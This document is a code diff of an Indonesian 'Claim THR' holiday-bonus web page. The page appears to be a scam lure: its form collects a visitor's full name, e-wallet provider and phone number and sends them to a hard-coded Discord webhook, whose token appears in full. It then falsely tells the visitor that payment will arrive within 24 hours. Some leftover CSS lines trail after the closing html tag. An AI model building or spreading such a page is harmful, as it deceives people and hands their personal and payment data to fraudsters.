@@ -1,39 +1,198 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Claim THR 🎁</title>
-
   <style>
-    body {
-      font-family: Arial;
-      background: linear-gradient(135deg, #f97316, #fb923c);
-      color: #fff7ed;
+    :root {
+      --primary: #f97316;
+      --primary-dark: #ea580c;
+      --bg-gradient: linear-gradient(135deg, #f97316, #fb923c);
+    }
 
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: var(--bg-gradient);
+      margin: 0;
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
-
-      margin: 0;
+      color: #333;
     }
 
     .box {
-      background: #ffffff;
-      color: #1f2937;
+      background: #fff;
       padding: 30px;
-      border-radius: 20px;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-      transition: all 0.5s ease;
-
-      width: 320px;
+      border-radius: 24px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+      width: 100%;
+      max-width: 350px;
       text-align: center;
+      transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
     }
 
-    input {
-      display: block;
-      margin: 10px auto;
-      padding: 12px;
+    h2 { margin-top: 0; color: #1f2937; }
+    p { color: #6b7280; font-size: 14px; }
+
+    input, select {
       width: 100%;
+      padding: 14px;
+      margin: 8px 0;
+      border: 1.5px solid #e5e7eb;
+      border-radius: 12px;
+      box-sizing: border-box;
+      font-size: 15px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    input:focus { border-color: var(--primary); }
+
+    .row { display: flex; gap: 8px; }
+    .row select { width: 40%; }
+    .row input { width: 60%; }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      margin-top: 15px;
+      border: none;
+      border-radius: 12px;
+      background: var(--primary);
+      color: white;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover:not(:disabled) {
+      background: var(--primary-dark);
+      transform: translateY(-2px);
+    }
+
+    button:disabled { opacity: 0.6; cursor: not-allowed; }
+
+    /* Animasi Transition */
+    .hidden { display: none; opacity: 0; transform: scale(0.95); }
+    .visible { display: block; opacity: 1; transform: scale(1); }
+
+    img { width: 150px; margin: 15px 0; border-radius: 15px; }
+  </style>
+</head>
+<body>
+
+<div class="box" id="step1">
+  <h2>🎁 Claim THR</h2>
+  <p>Isi data dengan benar untuk proses verifikasi.</p>
+
+  <input type="text" id="nama" placeholder="Nama Lengkap">
+
+  <div class="row">
+    <select id="ewallet">
+      <option value="DANA">DANA</option>
+      <option value="GoPay">GoPay</option>
+      <option value="OVO">OVO</option>
+      <option value="ShopeePay">ShopeePay</option>
+    </select>
+    <input type="tel" id="nomor" placeholder="08xxx" maxlength="13">
+  </div>
+
+  <button onclick="nextStep()">Lanjutkan</button>
+</div>
+
+<div class="box hidden" id="step2">
+  <h2>Hampir Selesai! ⏳</h2>
+  <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJueGZ0bmpxbmZ0bmpxbmZ0bmpxbmZ0bmpxbmZ0bmpxbmZ0JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/3o7aD2saalBwwftBIY/giphy.gif" alt="loading">
+  <p>Klik tombol di bawah untuk menyelesaikan proses.</p>
+  <button id="btnKirim" onclick="kirimData()">Konfirmasi & Kirim</button>
+</div>
+
+<div class="box hidden" id="success">
+  <h2 style="color: #10b981;">✔ Berhasil!</h2>
+  <p>Data kamu sudah diterima. Mohon tunggu proses pencairan dalam 1x24 jam.</p>
+</div>
+
+<script>
+let userData = {};
+
+function toggleBox(hideId, showId) {
+  const hideElem = document.getElementById(hideId);
+  const showElem = document.getElementById(showId);
+  
+  hideElem.classList.remove('visible');
+  hideElem.classList.add('hidden');
+  
+  setTimeout(() => {
+    hideElem.style.display = 'none';
+    showElem.style.display = 'block';
+    setTimeout(() => showElem.classList.add('visible'), 50);
+  }, 400);
+}
+
+function nextStep() {
+  const nama = document.getElementById("nama").value.trim();
+  const nomor = document.getElementById("nomor").value.trim();
+  const wallet = document.getElementById("ewallet").value;
+
+  if (nama.length < 3) {
+    alert("Masukkan nama yang valid ya.");
+    return;
+  }
+
+  if (!/^08[0-9]{8,11}$/.test(nomor)) {
+    alert("Nomor HP tidak valid (Gunakan format 08xxx).");
+    return;
+  }
+
+  userData = { nama, nomor, wallet };
+  toggleBox('step1', 'step2');
+}
+
+async function kirimData() {
+  const btn = document.getElementById("btnKirim");
+  btn.disabled = true;
+  btn.innerText = "Mengirim...";
+
+  const webhookURL = "https://discord.com/api/webhooks/1485179031275044935/UPou4NFWPwd4OQ7k5838-Q6vZaKjRsC7aGF6O0Fu-7hxs-gbkLP2jPYW7Ca7T9Dxb-Eb";
+
+  const payload = {
+    embeds: [{
+      title: "📩 New THR Claim",
+      color: 16351254,
+      fields: [
+        { name: "Nama", value: userData.nama, inline: true },
+        { name: "E-Wallet", value: userData.wallet, inline: true },
+        { name: "Nomor HP", value: userData.nomor }
+      ],
+      timestamp: new Date()
+    }]
+  };
+
+  try {
+    const response = await fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+
+    if (response.ok) {
+      toggleBox('step2', 'success');
+    } else {
+      throw new Error();
+    }
+  } catch (error) {
+    alert("Terjadi kesalahan teknis. Coba lagi nanti.");
+    btn.disabled = false;
+    btn.innerText = "Konfirmasi & Kirim";
+  }
+}
+</script>
+
+</body>
+</html>
       border-radius: 10px;
       border: 1px solid #e5e7eb;
       box-sizing: border-box;
